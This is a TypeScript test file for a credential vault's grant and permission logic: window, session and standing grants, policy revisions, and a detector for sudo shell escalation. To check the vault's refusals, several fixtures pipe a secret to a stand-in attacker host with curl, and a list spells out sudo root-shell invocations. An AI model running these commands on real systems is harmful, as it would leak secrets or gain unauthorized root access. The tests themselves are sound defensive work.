import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
	answeringOf,
	createVaultDecisions,
	displayShape,
	rememberable,
	runsAnything,
} from "../gateway/vault/decisions.js";
import { operationSet } from "../gateway/vault/operationSet.js";
import { openDurable } from "../shared/durable-store.js";
import type { AuthorizationPolicy } from "../shared/schemasPolicy.js";
import { VAULT_SESSION_GRANT_CAP_MS, VAULT_WINDOW_MS } from "../shared/schemasVault.js";

const roots: string[] = [];
afterEach(() => {
	for (const root of roots.splice(0)) fs.rmSync(root, { recursive: true, force: true });
});
const fresh = () => {
	const root = fs.mkdtempSync(path.join(os.tmpdir(), "vault-decisions-"));
	roots.push(root);
	return root;
};
let ids = 0;
const ambient = { newId: () => `grant-${++ids}` };
const open = (dataDir: string) =>
	openDurable(dataDir, "vault-decisions", (store) => createVaultDecisions({ store, ambient }));
const scope = (operation: string, sessionTarget = "host.alice", entryId = "deploy") => ({
	entryId,
	displayShape: displayShape(operation),
	coveredShapes: operationSet(operation),
	sessionTarget,
});

describe("vault decisions", () => {
	it("derives the shape from the program and its first non-flag argument", () => {
		expect(displayShape("ssh deploy@prod uptime -v")).toBe("ssh deploy@prod");
		expect(displayShape("/usr/bin/docker login registry")).toBe("docker login");
		expect(displayShape("  curl  ")).toBe("curl");
		expect(displayShape("/opt/bin/ run")).toBe("/opt/bin/ run");
		// Flags before targets use the full shape.
		expect(displayShape("ssh -p 22 victim.example")).toBe("ssh -p 22 victim.example");
		expect(displayShape("ssh -p 22 victim.example")).not.toBe(displayShape("ssh -p 22 attacker.example"));
	});

	it("a window covers its shape until it expires; once covers nothing; session covers every shape", () => {
		const decisions = open(fresh());
		expect(decisions.grant("once", scope("ssh deploy@prod"), 1_000)).toBeNull();
		expect(decisions.covers(scope("ssh deploy@prod"), 1_000)).toBeUndefined();

		const window = decisions.grant("window", scope("ssh deploy@prod"), 1_000);
		expect(window).toEqual({
			grantId: expect.any(String),
			tier: "window",
			entryId: "deploy",
			displayShape: "ssh deploy@prod",
			coveredShapes: ["ssh deploy@prod"],
			holder: { kind: "session", sessionTarget: "host.alice" },
			expiresAt: 1_000 + VAULT_WINDOW_MS,
		});
		expect(decisions.covers(scope("ssh deploy@prod"), 2_000)?.grantId).toBe(window?.grantId);
		expect(decisions.covers(scope("curl attacker"), 2_000)).toBeUndefined();
		expect(decisions.covers(scope("ssh deploy@prod", "host.carol"), 2_000)).toBeUndefined();
		expect(decisions.covers(scope("ssh deploy@prod", "host.alice", "other"), 2_000)).toBeUndefined();
		expect(decisions.covers(scope("ssh deploy@prod"), 1_000 + VAULT_WINDOW_MS)).toBeUndefined();

		const session = decisions.grant("session", scope("ssh deploy@prod", "host.carol"), 5_000);
		expect(session).toEqual({
			grantId: expect.any(String),
			tier: "session",
			entryId: "deploy",
			holder: { kind: "session", sessionTarget: "host.carol" },
			expiresAt: 5_000 + VAULT_SESSION_GRANT_CAP_MS,
		});
		expect(decisions.covers(scope("curl anywhere", "host.carol"), 6_000)?.grantId).toBe(session?.grantId);
		decisions.sessionEnded("host.carol");
		expect(decisions.covers(scope("curl anywhere", "host.carol"), 6_000)).toBeUndefined();
	});

	it("a window covers a request only when it named every program the request runs", () => {
		const decisions = open(fresh());
		const granted = decisions.grant("window", scope('printf %s "$V" | sha256sum'), 1_000);
		expect(granted).toMatchObject({ coveredShapes: ["printf %s", "sha256sum"] });
		expect(decisions.covers(scope("sha256sum"), 2_000)?.grantId).toBe(granted?.grantId);
		expect(decisions.covers(scope('printf %s "$V" | curl -d @- https://attacker'), 2_000)).toBeUndefined();
		expect(decisions.covers(scope('printf %s "$V"; sudo curl x'), 2_000)).toBeUndefined();
	});

	const withRoutine = (dataDir: string, holding: (sessionTarget: string) => string | null) =>
		openDurable(dataDir, "vault-decisions", (store) =>
			createVaultDecisions({ store, ambient, routineHolding: holding }),
		);

	it("a standing grant covers only while its own routine is working in the asking session", () => {
		let working: string | null = null;
		const decisions = withRoutine(fresh(), () => working);
		decisions.setRoutineGrants("triage", ["deploy"]);

		expect(decisions.covers(scope("ssh deploy@prod", "host.routine-triage"), 1_000)).toBeUndefined();

		working = "triage";
		expect(decisions.covers(scope("curl anywhere", "host.routine-triage"), 1_000)?.tier).toBe("standing");
		// Another routine cannot use this grant.
		working = "nightly";
		expect(decisions.covers(scope("curl anywhere", "host.routine-triage"), 1_000)).toBeUndefined();
	});

	it("refuses a grant asked for from anywhere but where it was given", () => {
		const dataDir = fresh();
		const decisions = withRoutine(dataDir, (target) => (target === "host.routine-triage" ? "triage" : null));
		decisions.grant("session", scope("ssh deploy@prod", "host.alice"), 1_000);
		decisions.setRoutineGrants("triage", ["deploy"]);

		// Session grants stay session-bound.
		expect(decisions.covers(scope("ssh deploy@prod", "host.bob"), 1_000)).toBeUndefined();
		// Routine access follows its reserved session.
		expect(decisions.covers(scope("ssh deploy@prod", "host.alice"), 1_000)?.tier).toBe("session");
		expect(decisions.covers(scope("x", "host.bob", "deploy"), 1_000)).toBeUndefined();
		expect(decisions.covers(scope("x", "host.routine-triage", "deploy"), 1_000)?.tier).toBe("standing");
		// Grants stay entry-bound.
		expect(decisions.covers(scope("x", "host.routine-triage", "npm"), 1_000)).toBeUndefined();
	});

	it("a stored grant the schema refuses starts the whole store fresh", () => {
		const dataDir = fresh();
		recorded(dataDir, [
			{
				grantId: "pre-holder",
				tier: "window",
				entryId: "deploy",
				displayShape: "ssh deploy@prod",
				coveredShapes: ["ssh deploy@prod"],
				sessionTarget: "host.alice",
				expiresAt: 9_000,
			},
			{
				grantId: "valid",
				tier: "session",
				entryId: "deploy",
				holder: { kind: "session", sessionTarget: "host.carol" },
				expiresAt: 9_000,
			},
		]);
		const decisions = open(dataDir);
		expect(decisions.list(1_000)).toEqual([]);
		expect(decisions.covers(scope("ssh deploy@prod uptime", "host.carol"), 1_000)).toBeUndefined();
	});

	it("a routine's grants are rewritten from its links, and go with the routine", () => {
		const dataDir = fresh();
		const decisions = withRoutine(dataDir, () => "triage");
		decisions.setRoutineGrants("triage", ["deploy", "npm"]);
		expect(decisions.setRoutineGrants("triage", ["deploy"]).map((g) => g.entryId)).toEqual(["deploy"]);

		// Unlinking revokes immediately.
		expect(decisions.covers(scope("x", "host.routine-triage", "npm"), 1_000)).toBeUndefined();
		expect(decisions.covers(scope("x", "host.routine-triage", "deploy"), 1_000)?.tier).toBe("standing");

		decisions.routineEnded("triage");
		expect(decisions.covers(scope("x", "host.routine-triage", "deploy"), 1_000)).toBeUndefined();
		expect(withRoutine(dataDir, () => "triage").list(1_000)).toEqual([]);
	});

	it("a deleted entry takes every holder's grant over it", () => {
		const decisions = withRoutine(fresh(), () => "triage");
		decisions.grant("session", scope("ssh deploy@prod"), 1_000);
		decisions.setRoutineGrants("triage", ["deploy"]);

		decisions.entryDeleted("deploy");

		expect(decisions.list(2_000)).toEqual([]);
	});

	it("a full list of what the vault holds takes a grant over anything not in it", () => {
		const decisions = withRoutine(fresh(), () => "triage");
		decisions.setRoutineGrants("triage", ["deploy", "npm"]);

		decisions.entriesListed(["deploy"]);

		expect(decisions.list(2_000).map((grant) => grant.entryId)).toEqual(["deploy"]);
	});

	const recorded = (dataDir: string, grants: Record<string, unknown>[]) =>
		fs.writeFileSync(path.join(dataDir, "vault-decisions.json"), JSON.stringify(grants));

	it("grants survive a reopen, and a revoke or an expiry drops them from the list", () => {
		const dataDir = fresh();
		const first = open(dataDir);
		const window = first.grant("window", scope("ssh deploy@prod"), 1_000);
		first.grant("session", scope("ssh deploy@prod", "host.carol"), 1_000);

		const reopened = open(dataDir);
		expect(
			reopened
				.list(2_000)
				.map((grant) => grant.tier)
				.sort(),
		).toEqual(["session", "window"]);
		expect(reopened.revoke(window?.grantId ?? "")).toBe(true);
		expect(reopened.revoke("missing")).toBe(false);
		expect(reopened.list(1_000 + VAULT_SESSION_GRANT_CAP_MS)).toEqual([]);
		expect(open(dataDir).list(2_000)).toEqual([]);
	});

	const policy = (revision: number, over: Partial<AuthorizationPolicy> = {}): AuthorizationPolicy => ({
		id: "apt",
		name: "Package administration",
		binding: { kind: "entry", entryId: "deploy" },
		selectorKeys: ["ssh deploy@prod"],
		enabled: true,
		revision,
		...over,
	});
	const through = (operation: string, policyRevision: number, sessionTarget = "host.alice", policyId = "apt") => ({
		...scope(operation, sessionTarget),
		policy: { policyId, policyRevision },
	});

	it("a policy grant covers what its policy resolved and never a bare use; an entry grant covers both", () => {
		const decisions = open(fresh());
		const qualified = decisions.grant("window", through("ssh deploy@prod", 1), 1_000);
		expect(qualified).toMatchObject({ policy: { policyId: "apt", policyRevision: 1 } });
		expect(decisions.covers(through("ssh deploy@prod", 1), 2_000)?.grantId).toBe(qualified?.grantId);
		expect(decisions.covers(scope("ssh deploy@prod"), 2_000)).toBeUndefined();
		expect(decisions.covers(through("ssh deploy@prod", 2), 2_000)).toBeUndefined();
		expect(decisions.covers(through("ssh deploy@prod", 1, "host.alice", "other"), 2_000)).toBeUndefined();

		// Policy windows cover only the selected shape.
		const compound = decisions.grant(
			"window",
			through("ssh deploy@prod uptime; curl https://evil", 1, "host.bob"),
			1_000,
		);
		expect(compound).toMatchObject({ coveredShapes: ["curl https://evil", "ssh deploy@prod"] });
		expect(decisions.covers(through("ssh deploy@prod", 1, "host.bob"), 2_000)?.grantId).toBe(compound?.grantId);
		expect(decisions.covers(through("curl https://evil", 1, "host.bob"), 2_000)).toBeUndefined();

		const wide = decisions.grant("session", scope("ssh deploy@prod", "host.carol"), 1_000);
		expect(decisions.covers(through("curl anywhere", 7, "host.carol"), 2_000)?.grantId).toBe(wide?.grantId);
		expect(decisions.covers(scope("curl anywhere", "host.carol"), 2_000)?.grantId).toBe(wide?.grantId);
	});

	it("a policy that moved takes only the grants it qualified; a vault list still holding the entry takes none", () => {
		const decisions = withRoutine(fresh(), () => "triage");
		decisions.grant("window", through("ssh deploy@prod", 1), 1_000);
		decisions.grant("session", scope("ssh deploy@prod", "host.carol"), 1_000);
		decisions.setRoutineGrants("triage", ["deploy"]);
		const shown = () => decisions.list(2_000).map((grant) => grant.tier);

		decisions.entriesListed(["deploy"]);
		expect(shown().sort()).toEqual(["session", "standing", "window"]);

		for (const moved of [
			policy(2, { name: "Renamed" }),
			policy(2, { enabled: false }),
			policy(3),
			policy(2, { binding: { kind: "entry", entryId: "other" } }),
			policy(1, { selectorKeys: ["ssh other"] }),
			null,
		]) {
			decisions.grant("window", through("ssh deploy@prod", 1), 1_000);
			decisions.policyMoved("apt", moved);
			expect(shown().sort()).toEqual(["session", "standing"]);
		}
		decisions.grant("window", through("ssh deploy@prod", 1), 1_000);
		decisions.policyMoved("apt", policy(1));
		expect(shown().sort()).toEqual(["session", "standing", "window"]);
		// Re-enabling advances the revision.
		decisions.policyMoved("apt", policy(2));
		expect(shown().sort()).toEqual(["session", "standing"]);
	});

	it("a restart prunes a grant whose policy moved while nothing listened", () => {
		const dataDir = fresh();
		const stale = {
			grantId: "stale",
			tier: "window",
			entryId: "deploy",
			displayShape: "ssh deploy@prod",
			coveredShapes: ["ssh deploy@prod"],
			holder: { kind: "session", sessionTarget: "host.alice" },
			expiresAt: 9_000,
			policy: { policyId: "apt", policyRevision: 1 },
		};
		recorded(dataDir, [stale, { ...stale, grantId: "current", policy: { policyId: "apt", policyRevision: 2 } }]);
		const decisions = open(dataDir);
		expect(decisions.list(1_000).map((grant) => grant.grantId)).toEqual(["stale", "current"]);

		decisions.policiesListed(() => policy(2));
		expect(decisions.list(1_000).map((grant) => grant.grantId)).toEqual(["current"]);
		expect(
			open(dataDir)
				.list(1_000)
				.map((grant) => grant.grantId),
		).toEqual(["current"]);
		expect(decisions.covers(through("ssh deploy@prod", 1), 1_000)).toBeUndefined();
	});

	it("a standing grant cannot be qualified by a policy", () => {
		const dataDir = fresh();
		recorded(dataDir, [
			{
				grantId: "wrong",
				tier: "standing",
				entryId: "deploy",
				holder: { kind: "routine", routineId: "t" },
				policy: { policyId: "apt", policyRevision: 1 },
			},
		]);
		expect(open(dataDir).list(1_000)).toEqual([]);
	});

	it("a service holds only a standing grant", () => {
		const dataDir = fresh();
		const service = { kind: "service", serviceId: "github" };
		recorded(dataDir, [{ grantId: "standing", tier: "standing", entryId: "deploy", holder: service }]);
		const kept = open(dataDir).list(1_000);
		recorded(dataDir, [
			{ grantId: "session", tier: "session", entryId: "deploy", holder: service, expiresAt: 9_000 },
		]);

		expect(kept.map((grant) => grant.grantId)).toEqual(["standing"]);
		expect(open(dataDir).list(1_000)).toEqual([]);
	});

	it("a watcher's stored grants carry over to its service, beside every other holder's", () => {
		const dataDir = fresh();
		const file = path.join(dataDir, "vault-decisions.json");
		const session = {
			grantId: "session",
			tier: "session",
			entryId: "deploy",
			holder: { kind: "session", sessionTarget: "host.alice" },
			expiresAt: 9_000,
		};
		const routine = {
			grantId: "routine",
			tier: "standing",
			entryId: "deploy",
			holder: { kind: "routine", routineId: "t" },
		};
		const stored = (grantId: string, watcherId: string, entryId: string) => ({
			grantId,
			tier: "standing",
			entryId,
			holder: { kind: "watcher", watcherId },
		});
		recorded(dataDir, [session, routine, stored("github", "github", "pat"), stored("ifttt", "ifttt", "key")]);

		const decisions = open(dataDir);
		expect(decisions.covers({ serviceId: "github", entryId: "pat" }, 1_000)?.grantId).toBe("github");
		expect(decisions.covers({ serviceId: "ifttt", entryId: "key" }, 1_000)?.grantId).toBe("ifttt");
		expect(decisions.list(1_000).map((grant) => grant.grantId)).toEqual(["session", "routine", "github", "ifttt"]);
		const holders = () =>
			(JSON.parse(fs.readFileSync(file, "utf8")) as { holder: unknown }[]).map((grant) => grant.holder);
		expect(holders()).toEqual([
			session.holder,
			routine.holder,
			{ kind: "service", serviceId: "github" },
			{ kind: "service", serviceId: "ifttt" },
		]);

		decisions.setServiceGrants("gmail", ["mail"]);
		expect(decisions.revoke("ifttt")).toBe(true);
		expect(holders()).toEqual([
			session.holder,
			routine.holder,
			{ kind: "service", serviceId: "github" },
			{ kind: "service", serviceId: "gmail" },
		]);
		const reopened = open(dataDir);
		expect(reopened.covers({ serviceId: "gmail", entryId: "mail" }, 1_000)).toBeDefined();
		expect(reopened.covers({ serviceId: "ifttt", entryId: "key" }, 1_000)).toBeUndefined();

		// Invalid files remain unchanged.
		const broken = [stored("github", "github", "pat"), { grantId: "bad", tier: "standing" }];
		recorded(dataDir, broken);
		expect(open(dataDir).list(1_000)).toEqual([]);
		expect(
			fs
				.readdirSync(dataDir)
				.some((name) => fs.readFileSync(path.join(dataDir, name), "utf8").includes('"service"')),
		).toBe(false);
	});

	it("reads standing grants without sweeping an expired one off disk", () => {
		const dataDir = fresh();
		const watcher = { kind: "service", serviceId: "github" };
		const held = [
			{ grantId: "standing", tier: "standing", entryId: "deploy", holder: watcher },
			{
				grantId: "lapsed",
				tier: "session",
				entryId: "deploy",
				holder: { kind: "session", sessionTarget: "host.alice" },
				expiresAt: 1,
			},
		];
		recorded(dataDir, held);
		const file = fs.readFileSync(path.join(dataDir, "vault-decisions.json"), "utf8");
		expect(
			open(dataDir)
				.standing()
				.map((grant) => grant.grantId),
		).toEqual(["standing"]);
		expect(fs.readFileSync(path.join(dataDir, "vault-decisions.json"), "utf8")).toBe(file);
	});

	it("a poisoned file starts the store fresh, and the next grant heals it", () => {
		const dataDir = fresh();
		fs.writeFileSync(path.join(dataDir, "vault-decisions.json"), JSON.stringify({ nope: 1 }));
		const poisoned = open(dataDir);
		expect(poisoned.list(1_000)).toEqual([]);
		const window = poisoned.grant("window", scope("ssh deploy@prod"), 1_000);
		expect(
			open(dataDir)
				.list(2_000)
				.map((grant) => grant.grantId),
		).toEqual([window?.grantId]);
	});
});

describe("what a typed request offers", () => {
	const held = (id: string, entryId: string, selectorKeys: string[], enabled = true): AuthorizationPolicy => ({
		id,
		name: id,
		binding: { kind: "entry", entryId },
		selectorKeys,
		enabled,
		revision: 3,
	});

	it("offers each usable entry an enabled policy binds under sudo, once, with its first policy, and none for another program", () => {
		const policies = [
			held("a-sudo", "pw", ["sudo apt"]),
			held("b-sudo", "pw", ["sudo setfacl"]),
			held("c-ssh", "deploy", ["ssh deploy@prod"]),
			held("d-off", "old", ["sudo install"], false),
			held("e-gone", "missing", ["sudo rm"]),
			held("f-sudo", "admin", ["sudo -u root id"]),
		];
		const usable = (entryId: string) => entryId !== "missing";
		expect(answeringOf("sudo apt-mark", policies, usable)).toEqual([
			{ entryId: "pw", policy: { policyId: "a-sudo", policyRevision: 3 } },
			{ entryId: "admin", policy: { policyId: "f-sudo", policyRevision: 3 } },
		]);
		expect(answeringOf("ssh other", policies, usable)).toEqual([]);
		expect(answeringOf("git push", policies, usable)).toEqual([]);
	});

	it("warns for a shell program, and for sudo's own shell options past their values", () => {
		const warned = [
			"sudo bash",
			"sudo /bin/sh",
			"sudo su",
			"zsh",
			"sudo -s",
			"sudo -i",
			"sudo -E -s",
			"sudo -iu root",
			"sudo --login",
			"sudo --shell id",
			"sudo -u root bash -c x",
			"sudo -E bash",
			"sudo --user root bash",
			"sudo -- bash",
			"sudo -E env bash",
			"sudo -E FOO=1 bash",
			"sudo sudo -s",
			"sudo env sudo -s",
			"sudo -E sudo -i",
			"sudo -R /x bash",
			"sudo --chroot /x bash",
		];
		const quiet = [
			"sudo apt",
			"sudo python3",
			"sudo -u simon apt",
			"sudo -usimon apt",
			"sudo --user=simon apt",
			"sudo -g wheel id",
			"sudo -E apt",
			"sudo -R /srv apt",
			"sudo --chroot /srv apt",
			"sudo -E env apt",
			"sudo --she",
			"ssh -i key host",
			"git status",
		];
		expect(warned.filter((key) => !runsAnything(key))).toEqual([]);
		expect(quiet.filter(runsAnything)).toEqual([]);
	});

	it("remembers only a key that is its own fixed point and fits the store", () => {
		expect(rememberable("sudo apt-mark")).toBe(true);
		expect(rememberable("sudo -A bash -c id")).toBe(false);
		expect(rememberable(`sudo -u root echo ${"x".repeat(600)}`)).toBe(false);
	});
});
